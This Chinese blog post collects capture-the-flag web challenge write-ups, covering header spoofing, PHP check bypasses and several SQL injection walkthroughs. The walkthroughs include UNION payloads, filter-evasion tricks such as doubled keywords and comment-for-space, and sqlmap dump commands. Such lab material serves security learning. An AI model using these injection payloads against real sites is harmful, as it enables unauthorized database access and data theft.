<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">want=flag</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402071152545.png" alt="image-20240207115218491"></p>
<p>需要admin，也就是说用户(user)的值应该为admin，那修改cookie为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=admin</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402071154095.png" alt="image-20240207115457054"></p>
<p>看来得从本地访问，修改X-Forwarded-For为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1</span><br></pre></td></tr></table></div></figure>

<p>最终为</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402071151586.png" alt="image-20240207115104463"></p>
<p>EXECUTE</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402071157102.png" alt="image-20240207115727060"></p>
<p>得到flag</p>

        <h1 id="五十三、-鹤城杯-2021-Middle-magic"   >
          <a href="#五十三、-鹤城杯-2021-Middle-magic" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十三、-鹤城杯-2021-Middle-magic" class="headerlink" title="五十三、[鹤城杯 2021]Middle magic"></a>五十三、[鹤城杯 2021]Middle magic</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402071217818.png" alt="image-20240207121715759"></p>
<p>①用GET方法传入参数aaa，使用 <code>preg_replace</code> 函数来过滤掉参数中的 “level” 字符串，并将其替换为 “<!-- filtered -->“。然后，使用 <code>preg_match</code> 函数检查处理后的 <code>$aaa</code> 变量中是否包含 “pass_the_level_1#” 字符串。如果包含，表示通过了第一级的检查。可以用换行符%0A来绕过</p>
<p>②用POST方法传入admin和root_pwd参数，两者值不等但是sha1值要相等。可以用数组绕过</p>
<p>③用POST方法传入level_3，将这个字段的内容作为 JSON 字符串解析，并将解析结果存储在变量 <code>$level_3</code> 中。接下来，代码比较 <code>$level_3</code> 对象的 <code>result</code> 属性是否等于某个预定义的 <code>$result</code> 变量的值，假设这个预定义的<code>$result</code>变量值为flag</p>
<p>最终用HackBar构造为：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402071216785.png" alt="image-20240207121647736"></p>
<p>EXECUTE后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402071223259.png" alt="image-20240207122354217"></p>
<p>得到flag</p>

        <h1 id="五十四、-SWPUCTF-2022-新生赛-where-am-i"   >
          <a href="#五十四、-SWPUCTF-2022-新生赛-where-am-i" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十四、-SWPUCTF-2022-新生赛-where-am-i" class="headerlink" title="五十四、[SWPUCTF 2022 新生赛]where_am_i"></a>五十四、[SWPUCTF 2022 新生赛]where_am_i</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402081051175.png" alt="image-20240208105147872"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402081052730.png" alt="image-20240208105208690"></p>
<p>查看网页源代码也没什么有用的信息，但是根据后面的11位提示可以知道是要我们填写一个电话号码，而它又放了一张图，猜测可能是要填写这个图所对应的电话号码，拿去百度识图</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402081054637.png" alt="image-20240208105447466"></p>
<p>得知酒店名，搜索这个酒店的电话为</p>
<p>02886112888</p>
<p>填入</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202402081055568.png" alt="image-20240208105546526"></p>
<p>得到flag</p>

        <h1 id="五十五、-FSCTF-2023-源码！启动"   >
          <a href="#五十五、-FSCTF-2023-源码！启动" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十五、-FSCTF-2023-源码！启动" class="headerlink" title="五十五、[FSCTF 2023]源码！启动!"></a>五十五、[FSCTF 2023]源码！启动!</h1>
      <p>名字直接提示了查看源码，尝试了右键和F12都被禁用了，那就直接在url前加上</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:</span><br></pre></td></tr></table></div></figure>

<p>同[UUCTF 2022 新生赛]websign</p>

        <h1 id="五十六、-SWPUCTF-2021-新生赛-easy-sql"   >
          <a href="#五十六、-SWPUCTF-2021-新生赛-easy-sql" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十六、-SWPUCTF-2021-新生赛-easy-sql" class="headerlink" title="五十六、[SWPUCTF 2021 新生赛]easy_sql"></a>五十六、[SWPUCTF 2021 新生赛]easy_sql</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261150467.png" alt="image-20240526115003383">让我们输入内容，并且网页名已经告知了参数为wllm</p>
<p>肯定是存在注入漏洞的</p>

        <h5 id="判断注入类型"   >
          <a href="#判断注入类型" class="heading-link"><i class="fas fa-link"></i></a><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h5>
      <p>输入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=1&#x27; or &#x27;1&#x27; = &#x27;1</span><br></pre></td></tr></table></div></figure>

<p><img src="C:/Users/86173/AppData/Roaming/Typora/typora-user-images/image-20240527162030720.png" alt="image-20240527162030720"></p>
<p>能正常返回说明是字符型注入</p>

        <h5 id="判断列数"   >
          <a href="#判断列数" class="heading-link"><i class="fas fa-link"></i></a><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=&#x27; union select 1,2,3--+</span><br><span class="line">/?wllm=&#x27; union select 1,2,3,4--+   //报错</span><br></pre></td></tr></table></div></figure>

<p>所以为2列</p>

        <h6 id="在url中，如果是get请求，url中的-是用来知道浏览器动作的，对服务器端无效，所以HTTP请求中不包括-，因此使用-闭合无法注释，会报错。而使用–-有个空格-在传输过程中空格也会被忽略，导致无法注释，所以在get请求传参注入时才会使用–-的方式来闭合，因为-会被注释为空格。"   >
          <a href="#在url中，如果是get请求，url中的-是用来知道浏览器动作的，对服务器端无效，所以HTTP请求中不包括-，因此使用-闭合无法注释，会报错。而使用–-有个空格-在传输过程中空格也会被忽略，导致无法注释，所以在get请求传参注入时才会使用–-的方式来闭合，因为-会被注释为空格。" class="heading-link"><i class="fas fa-link"></i></a><a href="#在url中，如果是get请求，url中的-是用来知道浏览器动作的，对服务器端无效，所以HTTP请求中不包括-，因此使用-闭合无法注释，会报错。而使用–-有个空格-在传输过程中空格也会被忽略，导致无法注释，所以在get请求传参注入时才会使用–-的方式来闭合，因为-会被注释为空格。" class="headerlink" title="在url中，如果是get请求，url中的#是用来知道浏览器动作的，对服务器端无效，所以HTTP请求中不包括#，因此使用#闭合无法注释，会报错。而使用– (有个空格)在传输过程中空格也会被忽略，导致无法注释，所以在get请求传参注入时才会使用–+的方式来闭合，因为+会被注释为空格。"></a>在url中，如果是get请求，url中的#是用来知道浏览器动作的，对服务器端无效，所以HTTP请求中不包括#，因此使用#闭合无法注释，会报错。而使用– (有个空格)在传输过程中空格也会被忽略，导致无法注释，所以在get请求传参注入时才会使用–+的方式来闭合，因为+会被注释为空格。</h6>
      
        <h5 id="获取数据库名"   >
          <a href="#获取数据库名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=&#x27;union select 1,2,group_concat(schema_name) from information_schema.schemata--+</span><br></pre></td></tr></table></div></figure>

<p><img src="C:/Users/86173/AppData/Roaming/Typora/typora-user-images/image-20240527162049911.png" alt="image-20240527162049911"></p>

        <h5 id="获取表名"   >
          <a href="#获取表名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h5>
      <p>查看test_db数据库内的表</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;test_db&#x27;--+</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261155595.png" alt="image-20240526115554536"></p>

        <h5 id="获取表字段名"   >
          <a href="#获取表字段名" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取表字段名" class="headerlink" title="获取表字段名"></a>获取表字段名</h5>
      <p>查看test_tb里的字段</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;test_db&#x27; and table_name=&#x27;test_tb&#x27;--+</span><br></pre></td></tr></table></div></figure>

<p><img src="C:/Users/86173/AppData/Roaming/Typora/typora-user-images/image-20240527162109023.png" alt="image-20240527162109023"></p>

        <h5 id="获取字段内容"   >
          <a href="#获取字段内容" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取字段内容" class="headerlink" title="获取字段内容"></a>获取字段内容</h5>
      <p>查看flag，构造最终payload：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=&#x27; union select 1,2,group_concat(flag) from test_db.test_tb--+</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405261158456.png" alt="image-20240526115822405"></p>

        <h1 id="五十七、-NCTF-2018-签到题"   >
          <a href="#五十七、-NCTF-2018-签到题" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十七、-NCTF-2018-签到题" class="headerlink" title="五十七、[NCTF 2018]签到题"></a>五十七、[NCTF 2018]签到题</h1>
      <p><img src="C:/Users/86173/AppData/Roaming/Typora/typora-user-images/image-20240527160736048.png" alt="image-20240527160736048"></p>
<p>一点开是一个百度的页面，但是URL上显示是一个/secret.php，访问一下首页/index.php，查看网页源代码也啥也没看见</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405271608920.png" alt="image-20240527160834865"></p>
<p>抓包发送到Repeater再发包</p>
<p><img src="C:/Users/86173/AppData/Roaming/Typora/typora-user-images/image-20240527160945174.png" alt="image-20240527160945174"></p>
<p>看到了flag，但是提交时要以NSSCTF{}格式提交</p>

        <h1 id="五十八、-SWPUCTF-2021-新生赛-error"   >
          <a href="#五十八、-SWPUCTF-2021-新生赛-error" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十八、-SWPUCTF-2021-新生赛-error" class="headerlink" title="五十八、[SWPUCTF 2021 新生赛]error"></a>五十八、[SWPUCTF 2021 新生赛]error</h1>
      <p><img src="C:/Users/86173/AppData/Roaming/Typora/typora-user-images/image-20240527162650715.png" alt="image-20240527162650715"></p>
<p>输入1后url传入id参数，可以直接用sqlmap</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://node4.anna.nssctf.cn:28238/index.php?id=1&quot; --dbs</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://node4.anna.nssctf.cn:28238/index.php?id=1&quot; -D test_db --tables</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://node4.anna.nssctf.cn:28238/index.php?id=1&quot; -D test_db -T test_tb --columns</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://node4.anna.nssctf.cn:28238/index.php?id=1&quot; -D test_db -T test_tb -C flag -dump</span><br></pre></td></tr></table></div></figure>

<p><img src="C:/Users/86173/AppData/Roaming/Typora/typora-user-images/image-20240527162825865.png" alt="image-20240527162825865"></p>

        <h1 id="五十九、-SWPUCTF-2021-新生赛-sql"   >
          <a href="#五十九、-SWPUCTF-2021-新生赛-sql" class="heading-link"><i class="fas fa-link"></i></a><a href="#五十九、-SWPUCTF-2021-新生赛-sql" class="headerlink" title="五十九、[SWPUCTF 2021 新生赛]sql"></a>五十九、[SWPUCTF 2021 新生赛]sql</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281040540.png" alt="image-20240528104050452"></p>
<p>参数是wllm，按老步骤注入</p>
<p>传入1’报语句错误从，存在注入</p>
<p>再传入1‘ or ’1‘=’1，提示请勿非法操作，看来是存在过滤</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281043049.png" alt="image-20240528104321959"></p>
<p>分别传入or、=、 1（前面有一个空格），发出只有or没有警告，所以是过滤了等号和空格</p>
<p>空格用/**/来绕过，等号用like代替</p>

        <h5 id="判断列数-1"   >
          <a href="#判断列数-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#判断列数-1" class="headerlink" title="判断列数"></a>判断列数</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=&#x27;union/**/select/**/1,2,3#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281049367.png" alt="image-20240528104932263"></p>
<p>看来是最后的#也被过滤了，用URL编码为%23</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=&#x27;union/**/select/**/1,2,3%23</span><br></pre></td></tr></table></div></figure>

<p>可得有三列</p>

        <h5 id="获取数据库名-1"   >
          <a href="#获取数据库名-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名-1" class="headerlink" title="获取数据库名"></a>获取数据库名</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=&#x27;union/**/select/**/1,2,group_concat(schema_name)/**/from/**/information_schema.schemata%23</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281053010.png" alt="image-20240528105350910"></p>
<p>但是只有一部分，使用截断函数一段一段的输出，尝试之后substr、left、right函数都被过滤了，这里用mid，这里最多只能显示20个字符，所以只能20个字符20个字符的输出</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=&#x27;union/**/select/**/1,2,mid(group_concat(schema_name),21,20)/**/from/**/information_schema.schemata%23</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281055906.png" alt="image-20240528105507807"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=%27union/**/select/**/1,2,mid(group_concat(schema_name),41,20)/**/from/**/information_schema.schemata%23</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281055923.png" alt="image-20240528105524822"></p>

        <h5 id="获取表名-1"   >
          <a href="#获取表名-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取表名-1" class="headerlink" title="获取表名"></a>获取表名</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=&#x27;union/**/select/**/1,2,group_concat(table_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/&#x27;test_db&#x27;%23   </span><br><span class="line">#LTLT_flag</span><br></pre></td></tr></table></div></figure>


        <h5 id="获取表字段名-1"   >
          <a href="#获取表字段名-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取表字段名-1" class="headerlink" title="获取表字段名"></a>获取表字段名</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=&#x27;union/**/select/**/1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/&#x27;test_db&#x27;/**/and/**/table_name/**/like/**/&#x27;LTLT_flag&#x27;%23</span><br></pre></td></tr></table></div></figure>

<p>还是出现了弹窗，猜测是过滤了关键词and，但是只要存在就会有警告框，所以只能更改语句</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=&#x27;union/**/select/**/1,2,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema/**/like/**/&#x27;test_db&#x27;%23  </span><br><span class="line">#flag</span><br><span class="line">#因为过滤了and，所以语句中只有数据库名</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281103979.png" alt="image-20240528110354927"></p>

        <h5 id="获取字段内容-1"   >
          <a href="#获取字段内容-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取字段内容-1" class="headerlink" title="获取字段内容"></a>获取字段内容</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=&#x27;union/**/select/**/1,2,group_concat(flag)/**/from/**/test_db.LTLT_flag%23</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405271659850.png" alt="image-20240527165905805"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=&#x27;union/**/select/**/1,2,mid(group_concat(flag),21,20)/**/from/**/test_db.LTLT_flag%23</span><br></pre></td></tr></table></div></figure>

<p><img src="C:/Users/86173/AppData/Roaming/Typora/typora-user-images/image-20240527170507333.png" alt="image-20240527170507333"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?wllm=&#x27;union/**/select/**/1,2,mid(group_concat(flag),41,20)/**/from/**/test_db.LTLT_flag%23</span><br></pre></td></tr></table></div></figure>

<p><img src="C:/Users/86173/AppData/Roaming/Typora/typora-user-images/image-20240527170602884.png" alt="image-20240527170602884"></p>
<p>SQL注入绕过技巧：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/Cairo_A/article/details/134882367" >https://blog.csdn.net/Cairo_A/article/details/134882367</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="六十、-LitCTF-2023-Http-pro-max-plus"   >
          <a href="#六十、-LitCTF-2023-Http-pro-max-plus" class="heading-link"><i class="fas fa-link"></i></a><a href="#六十、-LitCTF-2023-Http-pro-max-plus" class="headerlink" title="六十、[LitCTF 2023]Http pro max plus"></a>六十、[LitCTF 2023]Http pro max plus</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405272047355.png" alt="image-20240527204753296"></p>
<p>那就添加X-Forwarded-For头</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405272046340.png" alt="image-20240527204645273"></p>
<p>看来用X-Forwarded-For不行，查了一下说是添加client-ip为127.0.0.1</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405272045315.png" alt="image-20240527204524247"></p>
<p>添加Referer字段值为pornhub.com</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405272044268.png" alt="image-20240527204431197"></p>
<p>添加User-Agent字段值为Chrome</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405272043272.png" alt="image-20240527204318198"></p>
<p>添加代理via=的值为Clash.win</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405272033772.png" alt="image-20240527203337713"></p>
<p>访问/wtfwtfwtfwtf.php</p>
<p><img src="C:/Users/86173/AppData/Roaming/Typora/typora-user-images/image-20240527172302155.png" alt="image-20240527172302155"></p>
<p>查看网页源代码看到/sejishikong.php，访问一下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405271722292.png" alt="image-20240527172229251"></p>

        <h1 id="六十一、-SWPUCTF-2022-新生赛-xff"   >
          <a href="#六十一、-SWPUCTF-2022-新生赛-xff" class="heading-link"><i class="fas fa-link"></i></a><a href="#六十一、-SWPUCTF-2022-新生赛-xff" class="headerlink" title="六十一、[SWPUCTF 2022 新生赛]xff"></a>六十一、[SWPUCTF 2022 新生赛]xff</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405280954588.png" alt="image-20240528095438474"></p>
<p>从题目入手，用HackBar添加X-Forwarded-For头为127.0.0.1</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405280955712.png" alt="image-20240528095536671"></p>
<p>再添加Referer头为index，但几次尝试下来发现只要Referer有值就能得到flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405280956014.png" alt="image-20240528095630962"></p>

        <h1 id="六十二、-SWPUCTF-2022-新生赛-ez-sql"   >
          <a href="#六十二、-SWPUCTF-2022-新生赛-ez-sql" class="heading-link"><i class="fas fa-link"></i></a><a href="#六十二、-SWPUCTF-2022-新生赛-ez-sql" class="headerlink" title="六十二、[SWPUCTF 2022 新生赛]ez_sql"></a>六十二、[SWPUCTF 2022 新生赛]ez_sql</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281006807.png" alt="image-20240528100626739"></p>
<p>在URL上传参会提示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281006251.png" alt="image-20240528100659171"></p>
<p>那就是用POST方式，那就用HackBar传</p>
<p>传参为1时就有flag</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281008834.png" alt="image-20240528100810736"></p>
<p>但是提交了发现没那么简单…</p>
<p>传入1‘，有语句报错，再次传入1‘ or ’1‘=’1，还是和1一样的显示，判断是字符型注入</p>
<p>按照老步骤</p>

        <h5 id="判断列数-2"   >
          <a href="#判断列数-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#判断列数-2" class="headerlink" title="判断列数"></a>判断列数</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nss=&#x27;union select 1,2,3#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281019285.png" alt="image-20240528101905219"></p>
<p>但是有语句报错，可以看到是把前面的union和空格都过滤了</p>
<p>union用双写绕过，空格用/**/绕过</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nss=&#x27;uniunionon/**/select/**/1,2,3#</span><br><span class="line">nss=&#x27;uniunionon/**/select/**/1,2,3,4#  //报错</span><br></pre></td></tr></table></div></figure>

<p>所以有三列</p>

        <h5 id="获取数据库名-2"   >
          <a href="#获取数据库名-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名-2" class="headerlink" title="获取数据库名"></a>获取数据库名</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nss=&#x27;uniunionon/**/select/**/1,2,group_concat(schema_name)/**/from/**/information_schema.schemata#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281024254.png" alt="image-20240528102414157"></p>
<p>看来是又过滤了or，继续双写绕过</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nss=&#x27;uniunionon/**/select/**/1,2,group_concat(schema_name)/**/from/**/infoorrmation_schema.schemata#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281025559.png" alt="image-20240528102508464"></p>

        <h5 id="获取表名-2"   >
          <a href="#获取表名-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取表名-2" class="headerlink" title="获取表名"></a>获取表名</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nss=&#x27;uniunionon/**/select/**/1,2,group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=&#x27;NSS_db&#x27;#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281029838.png" alt="image-20240528102955757"></p>

        <h5 id="获取表字段名-2"   >
          <a href="#获取表字段名-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取表字段名-2" class="headerlink" title="获取表字段名"></a>获取表字段名</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nss=&#x27;uniunionon/**/select/**/1,2,group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_schema=&#x27;NSS_db&#x27;/**/and/**/table_name=&#x27;NSS_tb&#x27;#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281032478.png" alt="image-20240528103207417"></p>
<p>看来是过滤了and，继续双写绕过</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nss=&#x27;uniunionon/**/select/**/1,2,group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_schema=&#x27;NSS_db&#x27;/**/anandd/**/table_name=&#x27;NSS_tb&#x27;#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281032816.png" alt="image-20240528103243726"></p>

        <h5 id="获取字段内容-2"   >
          <a href="#获取字段内容-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取字段内容-2" class="headerlink" title="获取字段内容"></a>获取字段内容</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nss=&#x27;uniunionon/**/select/**/1,2,group_concat(flll444g)/**/from/**/NSS_db.NSS_tb#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281034885.png" alt="image-20240528103419783"></p>
<p>提交发现也不对…再换成Secr3t字段看看</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nss=&#x27;uniunionon/**/select/**/1,2,group_concat(Secr3t)/**/from/**/NSS_db.NSS_tb#</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281035772.png" alt="image-20240528103501682"></p>
<p>这次是真的正确的flag了</p>

        <h1 id="六十三、-LitCTF-2023-1zjs"   >
          <a href="#六十三、-LitCTF-2023-1zjs" class="heading-link"><i class="fas fa-link"></i></a><a href="#六十三、-LitCTF-2023-1zjs" class="headerlink" title="六十三、[LitCTF 2023]1zjs"></a>六十三、[LitCTF 2023]1zjs</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291307288.png" alt="image-20240529130739125"></p>
<p>查看网页源代码，右键不行那就在URL前添加view-source:</p>
<p>查找flag，两条但都没啥信息，也许是要访问什么文件，再查找php</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291309541.png" alt="image-20240529130912468"></p>
<p>访问这个/<span class="exturl"><a class="exturl__link"   href="mailto:&#102;&#64;&#x6b;&#x33;&#102;&#49;&#x61;&#x67;&#x2e;&#112;&#x68;&#x70;" >&#102;&#64;&#x6b;&#x33;&#102;&#49;&#x61;&#x67;&#x2e;&#112;&#x68;&#x70;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291309418.png"></p>
<p>这…拿着一些字符百度一下说是Jsfuck代码，那解密一下</p>
<p>F12打开控制台，将这一堆复制后回车</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405291314000.png" alt="image-20240529131457925"></p>

        <h1 id="六十四、-LitCTF-2023-Vim-yyds"   >
